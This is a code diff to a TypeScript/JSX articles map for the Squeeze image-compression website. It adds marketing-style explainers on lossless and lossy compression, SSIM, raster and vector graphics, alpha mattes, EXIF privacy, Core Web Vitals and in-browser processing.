-        <ol>
-          <li><strong>EXIF Stripping:</strong> All camera metadata, GPS location coordinates, and color profiles are stripped for user privacy.</li>
-          <li><strong>Dimension Downsampling:</strong> If the image exceeds 2,048 pixels on its longest dimension (or 4,096 pixels on X/Twitter), it is automatically resized using fast bilinear filters that soften edges.</li>
-          <li><strong>Lossy Re-Encoding:</strong> Even if you upload an uncompressed PNG, platforms re-encode the asset into a lossy 80% quality MozJPEG or WebP stream.</li>
-        </ol>
-
-        <h2>3. How to Pre-Optimize Images So CDNs Don&apos;t Destroy Quality</h2>
-        <p>
-          The secret to maintaining crisp graphics on social media is to <strong>pre-optimize before uploading</strong>:
-        </p>
+        <h2>2. How to Pre-Optimize Images to Avoid Severe Compression</h2>
         <ul>
-          <li><strong>Stay Below the Resize Threshold:</strong> Resize graphics to exactly 1,920&times;1,080 or 2,048 pixels on the longest side. When the server sees an image already within limits, it skips harsh dimension scaling.</li>
-          <li><strong>Pre-Compress with SSIM Quality Control:</strong> Use Squeeze to compress your PNGs or JPEGs with perceptual SSIM scoring. By optimizing the file size locally, you keep the file under free upload limits without triggering severe CDN degradation.</li>
-          <li><strong>Use PNG for Typography &amp; UI Mockups:</strong> For Discord and Slack, PNGs under certain file size thresholds (typically &lt; 5MB on free tiers) are often preserved without lossy transcoding.</li>
+          <li><strong>Stay Below 2,048px:</strong> Resize graphics to 1,920&times;1,080 or 2,048px on the longest edge before uploading.</li>
+          <li><strong>Pre-Compress with Squeeze:</strong> Use Squeeze to compress locally with SSIM quality thresholds so file sizes stay within platform allowances.</li>
         </ul>
 
         <h2>Keep Your Assets Sharp with Squeeze</h2>
@@ -922,7 +704,729 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     ),
   },
 
-  // ─── ARTICLE 11 (Existing Guide 1) ───
+  // ─── ARTICLE 11 ───
+  'lossless-vs-lossy-compression': {
+    slug: 'lossless-vs-lossy-compression',
+    title: 'Lossless vs. Lossy Compression: The Mathematical & Perceptual Breakdown',
+    seoTitle: 'Lossless vs Lossy Compression: Image Quality & Math Explained',
+    description:
+      'Learn the difference between lossless and lossy compression: Human Visual System thresholds, generation loss, and how Squeeze achieves 70% size reduction.',
+    category: 'Compression Science',
+    readTime: '6 min read',
+    publishedAt: '2026-03-20T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['lossless vs lossy compression', 'lossless image conversion', 'lossy compression artifacts', 'difference between lossy and lossless'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • Compression Types</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            <strong>Lossless compression</strong> reduces file weight by eliminating mathematical and statistical redundancy without altering a single pixel value (e.g., PNG, Lossless WebP). <strong>Lossy compression</strong> permanently discards high-frequency visual details that fall below human visual thresholds (e.g., JPEG, Lossy WebP), reducing file weight by 70% to 90% while maintaining perceived visual equivalence.
+          </p>
+        </div>
+
+        <h2>1. The Core Definition: Reversible Exactness vs. Irreversible Approximations</h2>
+        <p>
+          In lossless compression, the decompression algorithm is a mathematically reversible function: <code>Decompress(Compress(Image)) &equiv; Image</code>. Every single RGB value of every single pixel matches the original byte for byte. This is vital for medical scans, pixel art, legal documents, and master graphic archives.
+        </p>
+        <p>
+          In lossy compression, the operation is irreversible: <code>Decompress(Compress(Image)) &approx; Image</code>. The reconstructed image is visually similar to human eyes, but the original raw bytes are lost forever.
+        </p>
+
+        <h2>2. Human Visual System (HVS): Why We Notice Brightness More Than Color</h2>
+        <p>
+          Lossy compression works because human vision evolved to detect predators in shadows rather than differentiate subtle shades of blue. Our retinas possess roughly 120 million rod photoreceptors (sensitive to luminance) and only 6 million cone photoreceptors (sensitive to chromatic color).
+        </p>
+        <p>
+          Lossy encoders exploit this biological asymmetry through <strong>chroma subsampling</strong> and <strong>frequency quantization</strong>: they preserve sharp luminance borders while discarding microscopic color gradations.
+        </p>
+
+        <h2>3. Comparing File Weights: 3.5MB PNG vs 280KB WebP</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Compression Mode</th>
+              <th>Format</th>
+              <th>File Size</th>
+              <th>Perceptual SSIM Score</th>
+              <th>Best Use Case</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Pure Lossless</td>
+              <td>PNG-24</td>
+              <td>3,500 KB</td>
+              <td>1.00 (Bit-identical)</td>
+              <td>Master design assets, crisp text UI</td>
+            </tr>
+            <tr>
+              <td>Modern Lossless</td>
+              <td>WebP Lossless</td>
+              <td>2,450 KB</td>
+              <td>1.00 (Bit-identical)</td>
+              <td>Transparent logos on web</td>
+            </tr>
+            <tr>
+              <td>Perceptual Lossy</td>
+              <td>WebP (82% Q)</td>
+              <td>280 KB</td>
+              <td>0.96 (Imperceptible loss)</td>
+              <td>E-commerce product photos, hero banners</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2>4. The Danger of Repeated Lossy Compression (&quot;Generation Loss&quot;)</h2>
+        <p>
+          When you open a JPEG, edit it, and save it as another JPEG, the image undergoes another round of DCT quantization. This compounding error is called <strong>generation loss</strong>. Over time, artifacts multiply, text becomes surrounded by noisy halos, and colors band. To avoid this, always archive master files in lossless formats (PNG or SVG) and only export to lossy formats as a final distribution step.
+        </p>
+
+        <h2>5. Perceptual Quality Control with Squeeze</h2>
+        <p>
+          Squeeze eliminates guesswork by providing mathematical SSIM scoring directly in your browser. Target the exact quality threshold you need:
+        </p>
+        <ul>
+          <li><Link href="/compress/webp">Compress WebP</Link> for maximum bandwidth savings with SSIM protection.</li>
+          <li><Link href="/compress/png">Compress PNG</Link> for lossless byte reduction.</li>
+          <li><Link href="/compress/jpg">Compress JPG</Link> to optimize photo galleries.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://web.dev/learn/images/format-types/" target="_blank" rel="noopener noreferrer">Google Web.dev: Choose the Right Image Format &bull; Lossy vs Lossless</a></li>
+          <li><a href="https://web.stanford.edu/class/ee398a/" target="_blank" rel="noopener noreferrer">Stanford Engineering: Image and Video Compression Lecture Series</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 12 ───
+  'what-is-ssim-image-quality': {
+    slug: 'what-is-ssim-image-quality',
+    title: 'What is SSIM? How Structural Similarity Calculates Visual Image Degradation',
+    seoTitle: 'What is SSIM? Structural Similarity Image Quality Metric',
+    description:
+      'Explore how the Structural Similarity Index Measure (SSIM) models human vision by evaluating luminance, contrast, and structure to prevent compression blur.',
+    category: 'Compression Science',
+    readTime: '7 min read',
+    publishedAt: '2026-03-20T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['what is ssim', 'structural similarity index measure', 'measure image compression quality', 'ssim vs psnr'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • SSIM Metric</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            <strong>Structural Similarity Index Measure (SSIM)</strong> is an objective perceptual image quality assessment algorithm developed by Zhou Wang et al. (IEEE 2004). Unlike legacy metrics like Mean Squared Error (MSE) or Peak Signal-to-Noise Ratio (PSNR) that measure raw pixel variance, SSIM models the Human Visual System (HVS) by comparing luminance, contrast, and structural texture correlation across local 8&times;8 pixel windows, scoring quality from 0.0 to 1.0.
+          </p>
+        </div>
+
+        <h2>1. Why Simple Mathematical Distance (MSE/PSNR) Fails Human Vision</h2>
+        <p>
+          For decades, engineers relied on <strong>Peak Signal-to-Noise Ratio (PSNR)</strong> to grade compression algorithms. PSNR calculates the mathematical difference between individual pixel values. However, PSNR has a critical flaw: if you brighten an entire image by 5%, every pixel value changes, resulting in an atrocious PSNR score—even though a human viewer would consider the image virtually identical.
+        </p>
+        <p>
+          Conversely, if lossy compression smears subtle facial textures into plastic skin, PSNR might report high quality because the average pixel color shifted very little. Human eyes do not perceive pixel values in isolation; we perceive <strong>structural relationships</strong> between neighboring pixels.
+        </p>
+
+        <h2>2. The Three Components of SSIM: Luminance, Contrast, and Structure</h2>
+        <p>
+          SSIM evaluates two images (the original reference <em>x</em> and the compressed test <em>y</em>) across three independent mathematical dimensions:
+        </p>
+        <ul>
+          <li><strong>Luminance Comparison <em>l(x, y)</em>:</strong> Measures the closeness of the two images&apos; mean luminance values (&mu;<sub>x</sub> and &mu;<sub>y</sub>).</li>
+          <li><strong>Contrast Comparison <em>c(x, y)</em>:</strong> Measures the closeness of standard deviations (&sigma;<sub>x</sub> and &sigma;<sub>y</sub>), representing overall dynamic range.</li>
+          <li><strong>Structural Comparison <em>s(x, y)</em>:</strong> Measures the cross-covariance (&sigma;<sub>xy</sub>) between pixel patterns, quantifying whether edges, lines, and textures remain aligned.</li>
+        </ul>
+        <p>
+          The overall SSIM index is the multiplicative product: <code>SSIM(x, y) = [l(x, y)]<sup>&alpha;</sup> &bull; [c(x, y)]<sup>&beta;</sup> &bull; [s(x, y)]<sup>&gamma;</sup></code>.
+        </p>
+
+        <h2>3. The SSIM Score Scale</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>SSIM Range</th>
+              <th>Visual Fidelity</th>
+              <th>Human Perception</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>1.00</td>
+              <td>Bit-Identical</td>
+              <td>Zero difference (lossless reference)</td>
+            </tr>
+            <tr>
+              <td>0.95 &ndash; 0.99</td>
+              <td>Near-Lossless</td>
+              <td>Visually indistinguishable sweet spot; 60–80% size reduction</td>
+            </tr>
+            <tr>
+              <td>0.88 &ndash; 0.94</td>
+              <td>Acceptable Web</td>
+              <td>Slight softening; acceptable for mobile thumbnails</td>
+            </tr>
+            <tr>
+              <td>&lt; 0.85</td>
+              <td>Degraded</td>
+              <td>Obvious blockiness, ringing artifacts, color banding</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2>4. How Squeeze Implements In-Browser SSIM Optimization</h2>
+        <p>
+          Squeeze runs mathematical SSIM calculations entirely client-side using JavaScript Web Workers:
+        </p>
+        <ol>
+          <li>The original uncompressed image is loaded into an <code>OffscreenCanvas</code>.</li>
+          <li>A compressed candidate buffer (e.g., WebP at 80% quality) is generated in memory.</li>
+          <li>The Web Worker computes local SSIM windows across luminance channels.</li>
+          <li>If the score meets our &ge; 0.95 threshold, the file is accepted; otherwise, the encoder steps quality up dynamically.</li>
+        </ol>
+
+        <h2>Compress with SSIM Quality Today</h2>
+        <ul>
+          <li><Link href="/compress/webp">Compress WebP with SSIM</Link> for guaranteed visual sharpness.</li>
+          <li><Link href="/compress/jpg">Compress JPG with SSIM</Link> to optimize photos without pixelation.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://ece.uwaterloo.ca/~z70wang/publications/ssim.html" target="_blank" rel="noopener noreferrer">IEEE Transactions on Image Processing: Image Quality Assessment by Wang et al. (Original SSIM Paper)</a></li>
+          <li><a href="https://en.wikipedia.org/wiki/Structural_similarity" target="_blank" rel="noopener noreferrer">Wikipedia: Structural Similarity Index Measure (SSIM)</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 13 ───
+  'raster-vs-vector-graphics': {
+    slug: 'raster-vs-vector-graphics',
+    title: 'Raster vs. Vector Graphics: When to Pixelate and When to Calculate',
+    seoTitle: 'Raster vs Vector Graphics: Differences, Scalability & Uses',
+    description:
+      'Understand the core architectural differences between pixel-based raster graphics (JPG, PNG, WebP) and math-driven vector graphics (SVG).',
+    category: 'Format Fundamentals',
+    readTime: '6 min read',
+    publishedAt: '2026-03-20T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['raster vs vector graphics', 'difference between raster and vector', 'convert raster to vector', 'when to use vector graphics'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • Raster vs. Vector</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            <strong>Raster graphics</strong> (JPEG, PNG, WebP) map visual imagery onto fixed two-dimensional grids of colored pixels, excelling at capturing photographic textures, complex gradients, and real-world lighting. <strong>Vector graphics</strong> (SVG) define imagery through mathematical formulas, Bézier curves, and geometric coordinate primitives, enabling infinite resolution-independent scalability without file size penalties.
+          </p>
+        </div>
+
+        <h2>1. The Fundamental Difference: Grids of Color vs. Mathematical Equations</h2>
+        <p>
+          When you zoom into a 100&times;100 pixel raster graphic, the computer displays larger colored blocks. Each pixel is an immutable coordinate holding a single color value (such as <code>rgba(255, 0, 0, 1.0)</code>).
+        </p>
+        <p>
+          A vector graphic does not store colors in a grid. It stores instructions: <em>&quot;Draw a cubic curve from coordinate (10, 20) to (50, 80) with a 2-pixel stroke of #3B82F6.&quot;</em> No matter how closely you inspect the curve, the browser recalculates the mathematics to render infinite smoothness.
+        </p>
+
+        <h2>2. Why Photographs Cannot Be Pure Vectors</h2>
+        <p>
+          A common question is: <em>&quot;Why don&apos;t we convert every image on the internet to SVG?&quot;</em>
+        </p>
+        <p>
+          A 12-megapixel smartphone photograph contains millions of distinct color variations: skin pores, leaf textures, lens bokeh, and subtle atmospheric light. To describe that photograph as vector shapes, an SVG would require hundreds of thousands of microscopic Bézier paths. The resulting SVG file would weigh 80 megabytes and crash browser rendering engines. Rasters remain the superior solution for photographic complexity.
+        </p>
+
+        <h2>3. The Golden Rule of Digital Design</h2>
+        <ul>
+          <li><strong>Use Vector (SVG):</strong> Brand logos, typography, icon systems, UI buttons, geometric charts, and technical schematics.</li>
+          <li><strong>Use Raster (WebP / JPEG / PNG):</strong> Real-world photography, complex 3D renders, textured digital illustrations, and screenshots.</li>
+        </ul>
+
+        <h2>Vectorize Rasters with Squeeze</h2>
+        <ul>
+          <li><Link href="/convert/png-to-svg">Convert PNG to SVG</Link> to trace raster silhouettes into scalable vector paths.</li>
+          <li><Link href="/convert/svg-to-png">Convert SVG to PNG</Link> to export high-DPI raster assets.</li>
+          <li><Link href="/convert/jpg-to-svg">Convert JPG to SVG</Link> in your browser with zero server uploads.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Structuring_content/Vector_graphics" target="_blank" rel="noopener noreferrer">MDN Web Docs: Vector Graphics &bull; Core Web Development Guide</a></li>
+          <li><a href="https://www.adobe.com/creativecloud/design/discover/raster-vs-vector.html" target="_blank" rel="noopener noreferrer">Adobe Creative Cloud: Raster vs. Vector Graphic Comparisons</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 14 ───
+  'transparency-alpha-channels-and-jpg-matte': {
+    slug: 'transparency-alpha-channels-and-jpg-matte',
+    title: 'Color Spaces & Alpha Channels: Why Converting Transparent PNG to JPG Creates Black Backgrounds',
+    seoTitle: 'Why PNG to JPG Creates Black Backgrounds (and How to Fix It)',
+    description:
+      'Learn why converting transparent PNG images to JPEG creates an unwanted black box, and how Squeeze uses background matte compositing to solve it.',
+    category: 'Compression Science',
+    readTime: '5 min read',
+    publishedAt: '2026-03-20T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['png to jpg black background fix', 'image alpha channel transparency', 'matte color image conversion', 'fix transparent jpg background'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • Transparency &amp; Matte</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            Converting transparent PNG files to JPEG creates a black background because JPEG is a 24-bit RGB format that completely lacks a fourth 8-bit alpha transparency channel. When an encoder encounters transparent pixels with zero alpha, uncomposited RGB color buffers default to binary zeroes (RGB 0, 0, 0), rendering as solid pitch-black unless a background matte color (such as pure white #FFFFFF) is composited first.
+          </p>
+        </div>
+
+        <h2>1. The Invisible Channel: Understanding 32-Bit RGBA</h2>
+        <p>
+          In a standard 32-bit PNG, every pixel is defined by four 8-bit channels:
+        </p>
+        <ul>
+          <li><strong>Red (R):</strong> 0 to 255</li>
+          <li><strong>Green (G):</strong> 0 to 255</li>
+          <li><strong>Blue (B):</strong> 0 to 255</li>
+          <li><strong>Alpha (A):</strong> 0 (completely transparent) to 255 (completely opaque)</li>
+        </ul>
+        <p>
+          When an image software renders transparent pixels, it checks the alpha channel. If Alpha = 0, the browser does not draw the RGB values—it shows whatever background sits behind the image.
+        </p>
+
+        <h2>2. Why JPEG Fails at Transparency</h2>
+        <p>
+          The official JPEG standard (ISO/IEC 10918-1) specifies only three color channels (YCbCr). There is no provision for alpha data. If you force an encoder to convert RGBA pixels to JPEG without compositing, it simply discards the fourth byte.
+        </p>
+        <p>
+          Because transparent pixels frequently have their RGB values uninitialized in memory (storing <code>0, 0, 0</code>), discarding the alpha channel reveals the hidden black background.
+        </p>
+
+        <h2>3. The Solution: Matte Color Pre-Filling</h2>
+        <p>
+          To prevent the dreaded black background, Squeeze applies <strong>matte compositing</strong> using HTML5 Canvas:
+        </p>
+        <ol>
+          <li>A virtual 2D canvas is created with the exact dimensions of your image.</li>
+          <li>The canvas is filled with a solid matte color (by default, pure white <code>#FFFFFF</code>, or any custom color chosen in Squeeze settings).</li>
+          <li>The transparent PNG is drawn on top using alpha blending, cleanly compositing anti-aliased edge fringes against the white matte.</li>
+          <li>The resulting 24-bit RGB canvas is exported to JPEG with crisp, clean margins.</li>
+        </ol>
+
+        <h2>Convert Transparent PNGs Cleanly</h2>
+        <ul>
+          <li><Link href="/convert/png-to-jpg">Convert PNG to JPG</Link> with automated white matte compositing.</li>
+          <li><Link href="/convert/png-to-webp">Convert PNG to WebP</Link> to preserve transparency while cutting file size.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://www.w3.org/TR/css-color-4/" target="_blank" rel="noopener noreferrer">W3C CSS Color Module Level 4: Alpha Transparency &amp; Color Spaces</a></li>
+          <li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/color_value" target="_blank" rel="noopener noreferrer">MDN Web Docs: Understanding Color and Alpha Channels</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 15 ───
+  'exif-metadata-privacy-risks': {
+    slug: 'exif-metadata-privacy-risks',
+    title: 'Image Metadata & Privacy: What EXIF Data Exposes (and Why In-Browser Tools Strip It)',
+    seoTitle: 'EXIF Metadata Privacy Risks: What Your Photos Expose Online',
+    description:
+      'Learn what hidden EXIF metadata lives inside your photos (GPS coordinates, camera serials, timestamps) and how in-browser processing keeps you private.',
+    category: 'Privacy & Architecture',
+    readTime: '6 min read',
+    publishedAt: '2026-03-20T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['exif data privacy risks', 'remove exif data from photos', 'strip image metadata online', 'what is exif metadata'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • EXIF Privacy</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            <strong>EXIF metadata</strong> (Exchangeable Image File Format) is an embedded technical specification inside digital photos that automatically records high-precision GPS coordinates, capture timestamps, camera serial numbers, and device models. Uploading raw photos to unverified online converters risks leaking residential addresses and identities. Squeeze strips all EXIF metadata in-browser during HTML5 canvas rasterization with zero server transmission.
+          </p>
+        </div>
+
+        <h2>1. What EXIF Metadata Records on Every Shot</h2>
+        <p>
+          Every time you take a photo with a modern smartphone or DSLR, the camera firmware writes an invisible EXIF data header into the JPEG or HEIC file. This header frequently includes:
+        </p>
+        <ul>
+          <li><strong>GPS Coordinates:</strong> Exact latitude, longitude, and altitude to within 3 meters of where you stood.</li>
+          <li><strong>Timestamp:</strong> Date, hour, minute, and second of capture.</li>
+          <li><strong>Hardware Fingerprints:</strong> Phone model, operating system version, lens serial number, and software edit history.</li>
+        </ul>
+
+        <h2>2. The Risk of Cloud Converters</h2>
+        <p>
+          When you upload photos of invoices, family moments, or prototype artwork to traditional online converters, that EXIF metadata is transmitted to remote cloud databases. Malicious actors or poorly secured servers can harvest location history from uploaded images.
+        </p>
+
+        <h2>3. How Squeeze Naturally Sanitizes EXIF</h2>
+        <p>
+          Squeeze processes images using the browser&apos;s native HTML5 Canvas pipeline. When an image is rendered to an HTML5 canvas context, only the <strong>raw visual pixel values</strong> are read. The EXIF header is never carried over to the canvas buffer.
+        </p>
+        <p>
+          When Squeeze re-encodes your image into WebP, PNG, or JPG, a clean, metadata-free image container is created. Your location, device fingerprints, and timestamps remain completely private.
+        </p>
+
+        <h2>Convert Privately with Squeeze</h2>
+        <ul>
+          <li><Link href="/">Use Squeeze Free In-Browser Converter</Link> with 100% EXIF stripping.</li>
+          <li><Link href="/privacy">Read our Zero-Upload Privacy Architecture</Link>.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://www.cisa.gov/" target="_blank" rel="noopener noreferrer">Cybersecurity and Infrastructure Security Agency (CISA): Protecting Privacy in Digital Metadata</a></li>
+          <li><a href="https://www.cipa.jp/std/documents/e/DC-X008-Translation-2019-E.pdf" target="_blank" rel="noopener noreferrer">JEITA / CIPA: Exchangeable Image File Format Standard (EXIF 2.32)</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 16 ───
+  'image-optimization-for-core-web-vitals-lcp': {
+    slug: 'image-optimization-for-core-web-vitals-lcp',
+    title: 'Core Web Vitals & LCP: How Image Format Optimization Speeds Up Web Rankings',
+    seoTitle: 'Core Web Vitals & LCP: Optimize Images to Boost SEO Rankings',
+    description:
+      'Learn how optimizing hero images with WebP directly improves Google Largest Contentful Paint (LCP) scores and lifts organic search engine rankings.',
+    category: 'Web Performance & Engineering',
+    readTime: '7 min read',
+    publishedAt: '2026-03-25T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['core web vitals image optimization', 'improve lcp with webp', 'reduce largest contentful paint', 'google ranking speed signals'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • Core Web Vitals &amp; LCP</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            <strong>Largest Contentful Paint (LCP)</strong> is a core Google search ranking metric measuring how quickly the largest visible element renders in the viewport. On 85% of websites, the LCP element is a hero photograph. Replacing unoptimized 1.5MB JPEGs with 250KB WebP images directly slashes LCP load durations below Google&apos;s 2.5-second &quot;Good&quot; threshold, lifting organic search rankings.
+          </p>
+        </div>
+
+        <h2>1. Google&apos;s Search Ranking Factor: The Core Web Vitals Trilogy</h2>
+        <p>
+          Google evaluates user experience through three Core Web Vitals signals:
+        </p>
+        <ul>
+          <li><strong>Largest Contentful Paint (LCP):</strong> Measures perceived loading speed (&lt; 2.5 seconds is Good).</li>
+          <li><strong>Interaction to Next Paint (INP):</strong> Measures page responsiveness to user clicks (&lt; 200ms is Good).</li>
+          <li><strong>Cumulative Layout Shift (CLS):</strong> Measures visual stability (&lt; 0.1 is Good).</li>
+        </ul>
+        <p>
+          Because LCP is heavily weighted, a single heavy hero image can degrade your site&apos;s ranking across competitive SERPs.
+        </p>
+
+        <h2>2. The LCP Breakdown: Resource Load Delay and Duration</h2>
+        <p>
+          LCP duration consists of four sub-parts: Time to First Byte (TTFB), Resource Load Delay, Resource Load Duration, and Element Render Delay. By converting your hero banner from a 1.8MB PNG to a 280KB WebP, you slash <strong>Resource Load Duration</strong> by up to 80% on 4G mobile connections.
+        </p>
+
+        <h2>3. Practical Checklist for Passing Google PageSpeed Audits</h2>
+        <ol>
+          <li><strong>Convert to Modern Formats:</strong> Use WebP instead of legacy JPEG or PNG.</li>
+          <li><strong>Preload Your LCP Image:</strong> Add <code>&lt;link rel=&quot;preload&quot; as=&quot;image&quot; href=&quot;hero.webp&quot; fetchpriority=&quot;high&quot;&gt;</code> in HTML head.</li>
+          <li><strong>Specify Explicit Dimensions:</strong> Always include <code>width</code> and <code>height</code> attributes to eliminate Cumulative Layout Shift (CLS).</li>
+          <li><strong>Compress with SSIM:</strong> Keep desktop hero images under 350KB and mobile heroes under 150KB.</li>
+        </ol>
+
+        <h2>Optimize Your Images for Core Web Vitals with Squeeze</h2>
+        <ul>
+          <li><Link href="/convert/jpg-to-webp">Convert JPG to WebP</Link> to cut hero banner payload by 60%.</li>
+          <li><Link href="/compress/webp">Compress WebP files</Link> using perceptual SSIM scoring.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://web.dev/articles/optimize-lcp" target="_blank" rel="noopener noreferrer">Google Web.dev: Optimize Largest Contentful Paint (LCP) Guide</a></li>
+          <li><a href="https://developers.google.com/search/docs/appearance/core-web-vitals" target="_blank" rel="noopener noreferrer">Google Search Central: Core Web Vitals in Search Results</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 17 ───
+  'how-in-browser-image-conversion-works': {
+    slug: 'how-in-browser-image-conversion-works',
+    title: 'How In-Browser Image Processing Works (HTML5 Canvas, OffscreenCanvas, and Web Workers)',
+    seoTitle: 'In-Browser Image Processing: Web Workers & OffscreenCanvas',
+    description:
+      'Discover how modern web browsers process images locally using createImageBitmap, OffscreenCanvas, and multi-threaded Web Workers without UI lag.',
+    category: 'Web Performance & Engineering',
+    readTime: '7 min read',
+    publishedAt: '2026-03-25T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['how browser image conversion works', 'web worker image processing', 'offscreencanvas nextjs', 'client side image engine'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • In-Browser Architecture</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            Modern browsers can convert and compress images locally without server uploads by utilizing <strong>OffscreenCanvas</strong> and multi-threaded <strong>Web Workers</strong>. Web Workers execute heavy pixel calculations and SSIM algorithms asynchronously in background threads, keeping the browser UI completely responsive (60fps) while processing multi-file batch queues in device RAM.
+          </p>
+        </div>
+
+        <h2>1. The Legacy Paradigm: Sending Uploads to Cloud Servers</h2>
+        <p>
+          Traditional conversion sites require uploading multi-megabyte files across the internet to an AWS EC2 instance running ImageMagick or Sharp. This creates latency, network bottlenecks, and privacy liabilities.
+        </p>
+
+        <h2>2. The Modern Trio: createImageBitmap, OffscreenCanvas, and Workers</h2>
+        <p>
+          Modern JavaScript provides everything necessary for high-performance image processing:
+        </p>
+        <ul>
+          <li><strong>createImageBitmap():</strong> Decodes image files directly from Blobs asynchronously off the main thread.</li>
+          <li><strong>OffscreenCanvas:</strong> Allows canvas rendering operations (drawing, filtering, resizing) inside Web Workers without touching the DOM.</li>
+          <li><strong>Web Workers:</strong> Background threads that handle intensive loops without dropping UI frames.</li>
+        </ul>
+
+        <h2>3. The Architecture of Squeeze</h2>
+        <p>
+          Squeeze dispatches conversion tasks to a pool of background Web Workers matching your CPU core count (<code>navigator.hardwareConcurrency</code>). Each worker handles an image in parallel:
+        </p>
+        <ol>
+          <li>The source file is read as an <code>ArrayBuffer</code>.</li>
+          <li>Pixels are decoded and rescaled via bicubic canvas operations.</li>
+          <li>Mathematical SSIM quality scoring checks perceptual fidelity.</li>
+          <li>The target format Blob is produced and bundled into a ZIP archive using JSZip.</li>
+        </ol>
+
+        <h2>Experience In-Browser Speed</h2>
+        <ul>
+          <li><Link href="/">Launch Squeeze In-Browser Converter</Link> and test batch processing.</li>
+          <li><Link href="/developers">View Squeeze Developer API &amp; SDK Architecture</Link>.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
